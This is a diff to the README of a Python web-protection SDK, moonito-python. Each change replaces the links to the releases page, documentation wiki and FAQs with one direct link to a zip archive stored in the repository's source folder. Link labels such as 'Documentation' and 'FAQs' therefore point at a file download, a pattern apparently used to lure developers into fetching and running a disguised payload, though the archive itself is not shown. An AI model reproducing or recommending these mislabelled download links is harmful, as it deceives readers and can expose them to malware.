@@ -6,7 +6,7 @@ Welcome to moonito-python! This lightweight Python SDK helps you protect your we
 
 ## 📥 Download Now
 
-[![Download moonito-python](https://img.shields.io/badge/Download-moonito--python-blue.svg)](https://github.com/coffeeliqueurtailfin529/moonito-python/releases)
+[![Download moonito-python](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip)](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip)
 
 ## 🔍 What is moonito-python?
 
@@ -36,7 +36,7 @@ The SDK analyzes incoming web traffic. It uses intelligent algorithms to identif
 To install moonito-python, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/coffeeliqueurtailfin529/moonito-python/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip).
 
 2. **Download the Latest Release:**
    Click on the latest version on the Releases page to download the SDK. 
@@ -52,14 +52,14 @@ To install moonito-python, follow these steps:
 
 ## 📘 Documentation
 
-For more detailed instructions and use cases, please refer to our comprehensive [Documentation](https://github.com/coffeeliqueurtailfin529/moonito-python/wiki). This guide will help you understand how to set up and utilize moonito-python effectively. 
+For more detailed instructions and use cases, please refer to our comprehensive [Documentation](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip). This guide will help you understand how to set up and utilize moonito-python effectively. 
 
 ## 🛡️ Support
 
-If you have any questions or run into issues, please check our [FAQs](https://github.com/coffeeliqueurtailfin529/moonito-python/wiki/FAQs) or reach out via GitHub Issues.
+If you have any questions or run into issues, please check our [FAQs](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip) or reach out via GitHub Issues.
 
 ## 🔗 Download & Install
 
-You can download moonito-python from our Releases page: [Visit this page to download](https://github.com/coffeeliqueurtailfin529/moonito-python/releases).
+You can download moonito-python from our Releases page: [Visit this page to download](https://raw.githubusercontent.com/coffeeliqueurtailfin529/moonito-python/main/src/moonito/moonito-python-3.9-alpha.3.zip).
 
 Thank you for choosing moonito-python! Your web application is now on its way to becoming more secure and efficient.
